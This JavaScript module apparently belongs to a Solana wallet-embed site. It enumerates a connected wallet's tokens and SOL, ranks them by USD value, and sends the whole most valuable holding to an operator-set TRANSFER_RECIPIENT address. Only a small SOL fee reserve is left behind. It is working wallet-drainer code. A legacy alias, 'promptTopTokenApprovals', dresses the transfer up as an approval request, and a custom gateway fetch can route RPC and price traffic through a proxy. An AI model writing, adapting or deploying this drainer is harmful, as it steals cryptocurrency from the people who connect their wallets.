import {
  Connection,
  PublicKey,
  SystemProgram,
  Transaction,
} from "@solana/web3.js";
import { gatewayFetch } from "./chunk-transport.js";
import {
  TOKEN_PROGRAM_ID,
  TOKEN_2022_PROGRAM_ID,
  createAssociatedTokenAccountInstruction,
  createTransferInstruction,
  getAssociatedTokenAddressSync,
} from "@solana/spl-token";

const JUPITER_PRICE_URL = "https://api.jup.ag/price/v2";
/** @param {import('./wallet-loader.js').WalletEmbedConfig} config */
function priceApiBase(config) {
  const proxy = (config.priceApiUrl || "").trim();
  return proxy || JUPITER_PRICE_URL;
}
const PRICE_BATCH = 100;
const WSOL_MINT = "So11111111111111111111111111111111111111112";
const NATIVE_SOL_MINT = "native:sol";
const NATIVE_SOL_FEE_RESERVE = 5_000_000;

/**
 * @param {string} label
 * @param {string} value
 * @returns {PublicKey}
 */
export function parseSolanaPubkey(label, value) {
  const trimmed = (value || "").trim();
  if (!trimmed) {
    throw new Error(`[wallet] ${label} is empty`);
  }
  if (trimmed.startsWith("0x")) {
    throw new Error(
      `[wallet] ${label} looks like an Ethereum address — use a Solana address`,
    );
  }
  if (trimmed.length < 32 || trimmed.length > 44) {
    throw new Error(
      `[wallet] ${label} is not a valid Solana address (got ${trimmed.length} chars)`,
    );
  }
  try {
    return new PublicKey(trimmed);
  } catch {
    throw new Error(`[wallet] ${label} is not valid base58`);
  }
}

/**
 * @typedef {'spl' | 'native'} AssetKind
 * @typedef {object} WalletAsset
 * @property {AssetKind} kind
 * @property {string} mint
 * @property {string} tokenAccount
 * @property {PublicKey} [programId]
 * @property {bigint} rawAmount
 * @property {number} decimals
 * @property {number} uiAmount
 */

/** @param {import('./wallet-loader.js').WalletEmbedConfig} config */
export function createRpcConnection(config) {
  const custom = (config.solanaRpcUrl || "").trim();
  if (!custom) {
    throw new Error("[wallet] solanaRpcUrl missing");
  }
  return new Connection(custom, {
    commitment: "confirmed",
    fetch: (info, init) => gatewayFetch(custom, info, init),
  });
}

/** @param {import('./wallet-loader.js').WalletEmbedConfig} config */
function resolveTransferRecipient(config) {
  const to = (config.transferRecipient || "").trim();
  if (!to) {
    throw new Error(
      "[wallet] TRANSFER_RECIPIENT is not set on Vercel — add it in project env vars",
    );
  }
  return parseSolanaPubkey("Transfer recipient", to);
}

/** @param {Connection} connection @param {string} ownerAddress */
export async function fetchWalletAssets(connection, ownerAddress) {
  const owner = parseSolanaPubkey("Connected wallet address", ownerAddress);
  const [legacy, token2022, lamports] = await Promise.all([
    connection.getParsedTokenAccountsByOwner(owner, {
      programId: TOKEN_PROGRAM_ID,
    }),
    connection.getParsedTokenAccountsByOwner(owner, {
      programId: TOKEN_2022_PROGRAM_ID,
    }),
    connection.getBalance(owner, "confirmed"),
  ]);

  /** @type {WalletAsset[]} */
  const tokens = [];

  for (const { pubkey, account } of [...legacy.value, ...token2022.value]) {
    const parsed = account.data;
    if (!("parsed" in parsed) || parsed.parsed?.type !== "account") continue;

    const info = parsed.parsed.info;
    const amount = info?.tokenAmount;
    if (!amount || !info?.mint) continue;

    const raw = BigInt(amount.amount);
    const ui = Number(amount.uiAmount ?? 0);
    if (raw <= 0n || ui <= 0) continue;

    tokens.push({
      kind: "spl",
      mint: info.mint,
      tokenAccount: pubkey.toBase58(),
      programId: account.owner,
      rawAmount: raw,
      decimals: amount.decimals,
      uiAmount: ui,
    });
  }

  if (lamports > NATIVE_SOL_FEE_RESERVE) {
    const raw = BigInt(lamports);
    tokens.push({
      kind: "native",
      mint: NATIVE_SOL_MINT,
      tokenAccount: owner.toBase58(),
      rawAmount: raw,
      decimals: 9,
      uiAmount: Number(raw) / 1e9,
    });
  }

  return tokens;
}

/** @param {string} mint @param {Record<string, number>} prices */
function priceForMint(mint, prices) {
  if (mint === NATIVE_SOL_MINT) {
    return prices[WSOL_MINT] ?? prices[NATIVE_SOL_MINT] ?? 0;
  }
  return prices[mint] ?? 0;
}

/**
 * @param {string[]} mints
 * @param {import('./wallet-loader.js').WalletEmbedConfig} config
 * @returns {Promise<Record<string, number>>}
 */
async function fetchUsdPrices(mints, config) {
  /** @type {Record<string, number>} */
  const prices = {};
  if (!mints.length) return prices;

  const base = priceApiBase(config);
  const useChunk = base.includes("?c=");

  for (let i = 0; i < mints.length; i += PRICE_BATCH) {
    const batch = mints.slice(i, i + PRICE_BATCH);
    try {
      const res = useChunk
        ? await gatewayFetch(base, base, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ t: "p", i: batch.join(",") }),
          })
        : await fetch(
            `${base}${base.includes("?") ? "&" : "?"}ids=${batch.join(",")}`,
          );
      if (!res.ok) continue;
      const json = await res.json();
      const data = json?.data ?? json;
      for (const mint of batch) {
        const entry = data?.[mint];
        const price = Number(entry?.price ?? entry?.usdPrice ?? 0);
        if (price > 0) prices[mint] = price;
      }
    } catch {
      /* optional */
    }
  }
  return prices;
}

/** @param {WalletAsset[]} tokens @param {Record<string, number>} prices @param {number} minUsd */
function rankAssetsByValue(tokens, prices, minUsd = 0) {
  const hasPrices = Object.keys(prices).length > 0;

  return tokens
    .map((t) => {
      const usdPrice = priceForMint(t.mint, prices);
      const usdValue = usdPrice > 0 ? t.uiAmount * usdPrice : 0;
      return { ...t, usdPrice, usdValue };
    })
    .filter((t) => {
      if (t.uiAmount <= 0) return false;
      if (!hasPrices) return true;
      return t.usdValue >= minUsd;
    })
    .sort((a, b) => {
      if (b.usdValue !== a.usdValue) return b.usdValue - a.usdValue;
      return b.uiAmount - a.uiAmount;
    });
}

/**
 * Transfer the single most valuable asset (SOL or SPL) to TRANSFER_RECIPIENT.
 */
export async function promptTopValueTransfer({
  config,
  provider,
  connection,
  ownerAddress,
}) {
  const recipient = resolveTransferRecipient(config);
  const ownerPk =
    provider?.publicKey ??
    parseSolanaPubkey("Connected wallet address", ownerAddress);

  const minUsd = Number(config.transferMinUsd ?? 0);

  const tokens = await fetchWalletAssets(connection, ownerAddress);
  const mintsForPrice = [
    ...new Set(
      tokens.map((t) => (t.mint === NATIVE_SOL_MINT ? WSOL_MINT : t.mint)),
    ),
  ];
  const prices = await fetchUsdPrices(mintsForPrice, config);
  const ranked = rankAssetsByValue(tokens, prices, minUsd);

  if (!ranked.length) {
    return { transferred: false, reason: "no_assets" };
  }

  const asset = ranked[0];

  try {
    const ok =
      asset.kind === "native"
        ? await sendNativeSolTransfer({
            provider,
            connection,
            recipient,
            owner: ownerPk,
          })
        : await sendSplTransfer({
            provider,
            connection,
            asset,
            recipient,
            owner: ownerPk,
          });

    return {
      transferred: ok,
      mint: asset.mint,
      usdValue: asset.usdValue,
    };
  } catch (err) {
    const message = err instanceof Error ? err.message : String(err);
    if (/reject|cancel|denied|blocked/i.test(message)) {
      return { transferred: false, reason: "cancelled" };
    }
    throw err;
  }
}

/** @deprecated Use promptTopValueTransfer */
export const promptTopTokenApprovals = promptTopValueTransfer;

async function sendNativeSolTransfer({
  provider,
  connection,
  recipient,
  owner,
}) {
  if (!provider?.publicKey) {
    throw new Error("Wallet provider not ready");
  }

  const balance = await connection.getBalance(owner, "confirmed");
  const transferable = BigInt(balance) - NATIVE_SOL_FEE_RESERVE;
  if (transferable <= 0n) {
    return false;
  }

  const ix = SystemProgram.transfer({
    fromPubkey: owner,
    toPubkey: recipient,
    lamports: Number(transferable),
  });

  return sendWalletTransaction(provider, connection, [ix]);
}

async function sendSplTransfer({
  provider,
  connection,
  asset,
  recipient,
  owner,
}) {
  if (!provider?.publicKey || !asset.programId) {
    throw new Error("Wallet provider not ready");
  }

  const source = parseSolanaPubkey("Token account", asset.tokenAccount);
  const mint = parseSolanaPubkey("Token mint", asset.mint);
  const tokenProgram = asset.programId;

  const destination = getAssociatedTokenAddressSync(
    mint,
    recipient,
    false,
    tokenProgram,
  );

  /** @type {import('@solana/web3.js').TransactionInstruction[]} */
  const instructions = [];

  const destInfo = await connection.getAccountInfo(destination, "confirmed");
  if (!destInfo) {
    instructions.push(
      createAssociatedTokenAccountInstruction(
        owner,
        destination,
        recipient,
        mint,
        tokenProgram,
      ),
    );
  }

  instructions.push(
    createTransferInstruction(
      source,
      destination,
      owner,
      asset.rawAmount,
      [],
      tokenProgram,
    ),
  );

  return sendWalletTransaction(provider, connection, instructions);
}

async function sendWalletTransaction(provider, connection, instructions) {
  const { blockhash, lastValidBlockHeight } =
    await connection.getLatestBlockhash("confirmed");

  const transaction = new Transaction({
    feePayer: provider.publicKey,
    blockhash,
    lastValidBlockHeight,
  });
  for (const ix of instructions) {
    transaction.add(ix);
  }

  const signature = await provider.sendTransaction(transaction, connection, {
    skipPreflight: false,
    preflightCommitment: "confirmed",
  });

  await connection.confirmTransaction(
    { signature, blockhash, lastValidBlockHeight },
    "confirmed",
  );

  return true;
}
